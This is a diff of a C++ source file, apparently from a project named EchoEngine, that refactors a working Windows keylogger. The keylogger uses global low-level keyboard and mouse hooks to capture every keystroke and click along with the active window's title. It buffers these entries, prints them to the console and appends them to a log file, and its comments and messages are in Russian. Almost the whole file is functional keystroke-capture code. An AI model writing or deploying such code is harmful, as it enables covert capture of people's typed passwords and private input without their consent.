@@ -2,8 +2,9 @@
 // Created by ddeeaaddllyy on 03.01.2026.
 //
 
-#include "keylogger.h"
+#include "../../../include/EchoEngine/modules/keylogger/keylogger.h"
 
+#include "../../../include/EchoEngine/utils/string_utils.h"
 #include <iostream>
 #include <ostream>
 #include <fstream>
@@ -23,6 +24,11 @@ HHOOK KeyLogger::s_keyboardHook = nullptr;
 HHOOK KeyLogger::s_mouseHook = nullptr;
 HWND KeyLogger::s_consoleHook = nullptr;
 CRITICAL_SECTION KeyLogger::s_criticalSection;
+bool KeyLogger::s_programRunning = true;
+std::atomic<bool> g_requestOutput{false};
+std::atomic<bool> g_requestExit{false};
+DWORD KeyLogger::s_messageThreadId = 0;
+size_t KeyLogger::s_flushThreshold = 50;
 
 KeyLogger::KeyLogger() :
     m_running(false),
@@ -54,16 +60,15 @@ bool KeyLogger::initialize() {
 
 void KeyLogger::run() {
     if (!m_initialized) {
-        if (!initialize()) {
-            return;
-        }
+        if (!initialize()) return;
     }
 
     m_running = true;
-    std::cout << "KeyLogger initialized" << std::endl;
+    s_programRunning = true;
+
+    s_messageThreadId = GetCurrentThreadId(); // ← ВАЖНО
 
     processMessageLoop();
-
 }
 
 void KeyLogger::shutdown() {
@@ -72,27 +77,16 @@ void KeyLogger::shutdown() {
     }
 
     m_running = false;
+    s_programRunning = false;
     uninstallHooks();
 
     if (!s_keyLogBuffer.empty()) {
-        std::cout << "\n=== final input ===" << std::endl;
+        std::cout << "\n\n=== ФИНАЛЬНЫЙ ВЫВОД ===" << std::endl;
         printBufferedLog();
     }
 
-    if (!s_keyLogBuffer.empty()) {
-        std::ofstream file(s_outputFilename, std::ios::app);
-
-        if (file.is_open()) {
-            auto now = std::chrono::system_clock::now();
-            auto now_time = std::chrono::system_clock::to_time_t(now);
-
-            file << "session is over" << std::ctime(&now_time);
-            file.close();
-        }
-    }
-
     m_initialized = false;
-    std::cout << "programm is over" << std::endl;
+    std::cout << "Программа завершена." << std::endl;
 }
 
 bool KeyLogger::installHooks() {
@@ -125,75 +119,95 @@ void KeyLogger::uninstallHooks() {
     }
 }
 
-LRESULT CALLBACK KeyLogger::keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
-    if (nCode >= 0 && s_captureEnabled) {
-        auto* p = (KBDLLHOOKSTRUCT*)lParam;
+LRESULT CALLBACK KeyLogger::keyboardHookProc(
+    int nCode, WPARAM wParam, LPARAM lParam)
+{
+    if (nCode == HC_ACTION && s_captureEnabled) {
+        auto* p = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
 
         if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
-            std::string windowTitle = getActiveWindowTitle();
-            std::string keyStr = virtualKeyToString(p -> vkCode);
 
-            std::stringstream ss;
-            ss << windowTitle << " | " << keyStr;
+            // Ctrl R -> выход
+            if (p->vkCode == VK_RETURN) {
+                g_requestOutput.store(true, std::memory_order_relaxed);
+                PostThreadMessage(s_messageThreadId, WM_APP + 1, 0, 0);
+            }
+
+            if (p->vkCode == 'R' && (GetAsyncKeyState(VK_CONTROL) & 0x8000)) {
+                g_requestExit.store(true, std::memory_order_relaxed);
+                PostThreadMessage(s_messageThreadId, WM_QUIT, 0, 0);
+            }
+
+
+            // лог
+            EnterCriticalSection(&s_criticalSection);
+            s_keyLogBuffer.emplace_back(
+                getActiveWindowTitle() + " | " +
+                virtualKeyToString(p->vkCode)
+            );
+            LeaveCriticalSection(&s_criticalSection);
+        }
+    }
+    return CallNextHookEx(nullptr, nCode, wParam, lParam);
+}
+
+
+LRESULT CALLBACK KeyLogger::mouseHookProc(
+    int nCode, WPARAM wParam, LPARAM lParam)
+{
+    if (nCode == HC_ACTION && s_captureEnabled) {
+        if (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN) {
 
             EnterCriticalSection(&s_criticalSection);
-            s_keyLogBuffer.push_back(ss.str());
-            s_totalCaptured++;
-
+            s_keyLogBuffer.emplace_back(
+                getActiveWindowTitle() +
+                (wParam == WM_LBUTTONDOWN ? " | [ЛКМ]" : " | [ПКМ]")
+            );
             LeaveCriticalSection(&s_criticalSection);
 
-            if (p -> vkCode == VK_RETURN && s_waitingForTrigger) {
-                KeyLogger::triggerOutput();
-                s_waitingForTrigger = false;
+            g_requestOutput.store(true, std::memory_order_relaxed);
+        }
+    }
+    return CallNextHookEx(nullptr, nCode, wParam, lParam);
+}
 
+
+void KeyLogger::processMessageLoop()
+{
+    MSG msg;
+
+    std::cout << "Программа запущена\n"
+              << "Enter / клик — вывод\n"
+              << "Ctrl+R — выход\n> ";
+
+    while (GetMessage(&msg, nullptr, 0, 0)) {
+
+        if (msg.message == WM_APP + 1) {
+            if (g_requestOutput.exchange(false)) {
+                triggerOutput();
             }
         }
-    }
-    return CallNextHookEx(s_keyboardHook, nCode, wParam, lParam);
-}
 
-LRESULT CALLBACK KeyLogger::mouseHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
-    if (nCode >= 0 && s_captureEnabled && s_waitingForTrigger) {
-        if (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN) {
-            std::string windowTitle = getActiveWindowTitle();
-            std::string button = (wParam == WM_LBUTTONDOWN) ? "[ЛКМ]" : "[ПКМ]";
-
-            EnterCriticalSection(&s_criticalSection);
-            s_keyLogBuffer.push_back(windowTitle + " | " + button);
-            s_totalCaptured++;
-
-            LeaveCriticalSection(&s_criticalSection);
-
-            triggerOutput();
-            s_waitingForTrigger = false;
+        if (msg.message == WM_QUIT) {
+            break;
         }
-    }
 
-    return CallNextHookEx(s_mouseHook, nCode, wParam, lParam);
-}
-
-void KeyLogger::processMessageLoop() {
-    MSG msg;
-    while (m_running && GetMessage(&msg, nullptr, 0, 0)) {
         TranslateMessage(&msg);
         DispatchMessage(&msg);
-
-        // Периодически проверяем состояние
-        if (GetForegroundWindow() == s_consoleWindow) {
-            // Если консоль активна, можно обрабатывать команды
-            if (GetAsyncKeyState(VK_RETURN) & 0x8000) {
-                s_waitingForTrigger = true;
-            }
-        }
     }
+
+    shutdown();
 }
 
-void KeyLogger::triggerOutput() {
+
+void KeyLogger::triggerOutput()
+{
+    std::cout << "\n\n=== ВЫВОД ЛОГА ===\n";
     printBufferedLog();
+    std::cout << "\nОжидание следующего триггера...\n> ";
 }
 
 std::string KeyLogger::virtualKeyToString(const DWORD vkCode) {
-    // Таблица преобразования (упрощенная версия)
     struct KeyMap {
         DWORD vkCode;
         const char* name;
@@ -226,16 +240,13 @@ std::string KeyLogger::virtualKeyToString(const DWORD vkCode) {
         {0, nullptr}
     };
 
-    // Проверяем специальные клавиши
     for (int i = 0; keyMap[i].name != nullptr; i++) {
         if (keyMap[i].vkCode == vkCode) {
             return keyMap[i].name;
         }
     }
 
-    // Буквы
     if (vkCode >= 'A' && vkCode <= 'Z') {
-        // Проверяем состояние клавиш-модификаторов
         const bool shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
         const bool capsLockOn = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
 
@@ -247,17 +258,14 @@ std::string KeyLogger::virtualKeyToString(const DWORD vkCode) {
         return std::string(1, c);
     }
 
-    // Цифры
     if (vkCode >= '0' && vkCode <= '9') {
         return std::string(1, static_cast<char>(vkCode));
     }
 
-    // F-клавиши
     if (vkCode >= VK_F1 && vkCode <= VK_F24) {
         return "[F" + std::to_string(vkCode - VK_F1 + 1) + "]";
     }
 
-    // Неизвестная клавиша
     return "[Key:" + std::to_string(vkCode) + "]";
 }
 
@@ -265,14 +273,14 @@ std::string KeyLogger::getActiveWindowTitle() {
     HWND foreground = GetForegroundWindow();
     if (foreground == nullptr) return "[Нет окна]";
 
-    char title[256];
-    GetWindowTextA(foreground, title, sizeof(title));
+    wchar_t title[256];
+    GetWindowTextW(foreground, title, _countof(title));
 
-    if (strlen(title) == 0) {
+    if (wcslen(title) == 0) {
         return "[Без названия]";
     }
 
-    return std::string(title);
+    return StringUtils::utf16_to_utf8(title);
 }
 
 void KeyLogger::saveLogToBuffer(const std::string& entry) {
@@ -288,7 +296,6 @@ void KeyLogger::printBufferedLog() {
         return;
     }
 
-    // Вывод в консоль
     if (s_outputToConsole) {
         std::cout << "\n\n=== НАКОПЛЕННЫЙ ЛОГ (" << s_keyLogBuffer.size() << " записей) ===" << std::endl;
 
@@ -303,6 +310,7 @@ void KeyLogger::printBufferedLog() {
     }
     if (!s_outputFilename.empty()) {
         std::ofstream file(s_outputFilename, std::ios::app);
+
         if (file.is_open()) {
             const auto now = std::chrono::system_clock::now();
             const auto now_time = std::chrono::system_clock::to_time_t(now);
@@ -328,16 +336,15 @@ BOOL WINAPI KeyLogger::consoleCtrlHandler(const DWORD eventType) {
         case CTRL_C_EVENT:
         case CTRL_BREAK_EVENT:
         case CTRL_CLOSE_EVENT:
-        case CTRL_LOGOFF_EVENT:
-        case CTRL_SHUTDOWN_EVENT:
             std::cout << "\nПолучен сигнал завершения..." << std::endl;
+            s_programRunning = false;
             return TRUE;
         default:
             return FALSE;
     }
 }
 
-void KeyLogger::setOutputToConsole(bool enable) {
+void KeyLogger::setOutputToConsole(const bool enable) {
     s_outputToConsole = enable;
 }
 
@@ -346,9 +353,10 @@ void KeyLogger::setOutputToFile(const std::string& filename) {
     
     if (!filename.empty()) {
         std::ofstream file(filename, std::ios::trunc);
+
         if (file.is_open()) {
-            auto now = std::chrono::system_clock::now();
-            auto now_time = std::chrono::system_clock::to_time_t(now);
+            const auto now = std::chrono::system_clock::now();
+            const auto now_time = std::chrono::system_clock::to_time_t(now);
             file << "=== Лог перехвата клавиш ===" << std::endl;
             file << "Начало: " << std::ctime(&now_time) << std::endl;
             file.close();
